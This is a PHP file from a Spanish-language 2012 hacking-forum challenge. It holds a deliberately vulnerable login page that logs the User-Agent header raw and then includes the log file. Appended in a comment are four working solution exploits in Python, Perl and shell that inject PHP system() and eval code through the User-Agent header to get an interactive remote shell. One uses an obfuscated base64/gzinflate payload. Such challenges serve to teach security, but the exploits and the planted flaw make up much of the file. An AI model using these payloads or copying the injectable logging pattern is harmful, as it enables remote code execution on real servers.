<?php
/*
Author: 2Fac3R
Date:  Abril 25, 2012
Title: [Reto] HackMe Bug 1
Site: HackxCrack

OBJETIVO: 
Hacer un exploit que nos devuelva una shell lista para explorar el sistema vulnerado.

*/
echo '<title> Reto semanal HackxCrack By 2Fac3R </title>';
   # Datos del usuario---------------------
   $user = htmlentities($_POST['user']);
   $pass = htmlentities($_POST['pass']);
   $browser = $_SERVER['HTTP_USER_AGENT'];
   $ip = $_SERVER['REMOTE_ADDR'];
   #----------------------------------------
$arch_logs = <<<log
------------------------------------------ <br>
Usuario: $user<br>
Password: $pass <br>
Navegador: $browser <br>
Direcci&oacute;n IP: $ip <br>
------------------------------------------ <br>
log;
if(empty($user) || empty($pass)){
   if(isset($_POST['send'])){
      die("Debes ingresar datos!");
   }
   ?>
    <!--   Reto Semanal Hackxcrack By 2Fac3R   -->
    <h2> Login de usuario: </h2>
    <!--   Cualquier usuario puede ingresar, agregando sus datos   -->
    <form action="" method="POST"> Usuario:
        <input type="text" name="user">
        <br> Password:
        <input type="password" name="pass">
        <br>
        <input type="submit" name="send" value="Ingresar!"> </form>
    <?
}else{
   $logs = fopen('logs.txt','a+');
   if(fwrite($logs,$arch_logs)){
      if($user=='Admin' && $pass == '1234abcd'){
         echo "Bienvenido Administrador, aqui esta el archivo de logs: <br>";
         include_once("logs.txt");   
      }else{
      echo "Bienvenido usuario <br>";
      include("archivo.php"); // Archivo que supuestamente no esta permitido para un usuario sin login
      }
   }else{
      die("No has sido loggeado correctamente");
   }
}

/*

SOLUCIONES:

z0mw33d

#!/usr/bin/env python
import httplib, urllib, sys, os
os.system('clear')
print "## W4rG4m3 HackMe - HackxCrack ##"
print "## Exploit codeado por z0mw33d ##"
print "---------------------------------"
print "Help:"
print "		exit -> Cerrar el Exploit"
opcion = raw_input("Comando -> ")
while opcion != "exit":
	parametros = urllib.urlencode({'user':'Admin','pass':'1234abcd','cmd': opcion})
	cabecera = {"Content-type": "application/x-www-form-urlencoded","Accept": "text/plain","User-Agent": "<?php system($_POST['cmd']);?>"}
	conexion = httplib.HTTPConnection('localhost:80')
	conexion.request("POST", "/wargames/HackMe.php", parametros, cabecera)
	respuesta = conexion.getresponse()
	if respuesta.status == 200:
		ver_source = respuesta.read().split("<br>")
		print ver_source[len(ver_source)-4];
		conexion.close()
		opcion = raw_input("COMANDO -> ")
	else:
		break;



11Sep

#!/usr/bin/python

import urllib2
import urllib

Shell = {'User-Agent': '<?php echo("11Sep"); system($_POST["Once"]); echo("11Sep"); ?>'}
Variables = urllib.urlencode({'user': 'Admin', 'pass': '1234abcd'})

Buff = urllib2.Request('http://127.0.0.1/', Variables, headers = Shell)
urllib2.urlopen(Buff)

print 'Shell inyectada, Salir para salir'

while True:
    Cmd = raw_input('Ingrese el comando: ')
    if Cmd == 'Salir':
        break
    Rsp = urllib2.urlopen('http://127.0.0.1/', urllib.urlencode({'user': 'Admin', 'pass': '1234abcd', 'Once': Cmd})).read()
    print 'Respuesta del server:'
    print Rsp.split('11Sep')[1]


Kid_goth

#!usr/bin/perl

#  Exploit Reto 2Fac3R - Bug 1
#-----------------------------------------------------------#
#    El objetivo del codigo es insertar codigo malicioso    #
#    en las cabeceras de la conexion a la web al acceder    #
#    y por medio del archivo log y obtener lo que se desee  #
#-----------------------------------------------------------#
#
#    Agradecimientos a doddy por la guia de perl forever
#    y a 2Fac3R por los retos
#
#  Author kid_goth - HackxCrack

use LWP::UserAgent;
use HTTP::Request;

print "Escriba la url del archivo vulnerable: ";
my $url = <STDIN>; #url del archivo xD http://localhost/Scripts/ret2Fac4.php
my $vars = "user=Admin&pass=1234abcd"; # Datos del form

my $nav = LWP::UserAgent->new();

$sh = "<?php eval(gzinflate(base64_decode('NY9dS8MwGEb/yssoJIGhc9op1Dp0elG3btS01e5GsiZtY1+afrFBxf9uJ3j3cDgX57G6QiGCC5P7ZV3UoI4CaT7oKkPRK3oQnVrcfEqVGqko4YsrL5T7QH/I6+cE38M7exsll3HEcTf46HPJZ3H5tdnM6m3o3wa5Z8zrU9I2u7fSbuJmjUFbr/aVvepMfijnPIrnvE/WffDoEsaYA8uHiQOWaFM3M7WqKBlnoY/mYowjUyCCjJLOaHZq9dh3Nqdg/Z1g7BtUWhggvhk0oiAO/CjsFPxz7+WMfgE='))); ?>";

$nav->agent($sh);

my $webpag = HTTP::Request->new(POST => $url);
$webpag->content_type('application/x-www-form-urlencoded');
$webpag->content($vars);

my $resp = $nav->request($webpag)->content();

print "Content-type: text/html\n\n";
print ".:Exploit complete:.\n";
print "\n";
print ".:Entra a http://servidor.../archivo.php?cmd=__Comando__\n";
print "\nby Kid_Goth";<STDIN>


2Fac3R

#!/bin/sh
clear
#####################################
# Wargame HackMe bug 1 Exploit      #
# Reto semanal HackxCrack By 2Fac3R #
#####################################
echo "
#####################################
Ingresa la URL del archivo vulnerable
#####################################"
read url 
clear
echo "
#######################################
Ahora ingresa la ubicación de tu shell
#######################################"
read shell
clear
echo "El archivo vulnerable ha sido inyectado correctamente de la siguiente manera

"
curl -d 'user=Admin&pass=1234abcd' -H 'User-Agent:<?system("cat '$shell'>hackme.php")?>' $url


Explicación:

En este reto, la vulnerabilidad consite en inyectar codigo malicioso por medio de las cabeceras HTTP, 
en este caso vemos que los exploit se aprovechan de User-Agent (Indica el navegador que se está usando), 
el cual no filtra lo que el usuario pueda ingresar/modificar.

*/
?>